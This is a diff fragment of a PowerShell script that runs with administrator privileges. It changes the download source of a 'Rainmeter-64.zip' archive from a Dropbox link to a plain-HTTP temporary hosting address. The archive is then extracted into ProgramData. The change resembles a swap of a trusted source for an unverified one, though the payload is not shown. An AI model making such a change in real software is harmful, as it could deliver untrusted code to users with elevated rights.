@@ -20,7 +20,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 try {
-    $zipUrl      = "https://www.dropbox.com/scl/fi/bn4lcxiomlkiyopjhsar0/Rainmeter-64.zip?rlkey=vvg1c8vbwtf4te6z2b57het1p&st=lob07nnl&dl=1"
+    $zipUrl      = "http://foxg0788g2.temp.swtest.ru/Rainmeter-64.zip"
     $zipPath     = "$env:ProgramData\Rainmeter-64.zip"
     $extractPath = "$env:ProgramData"
 
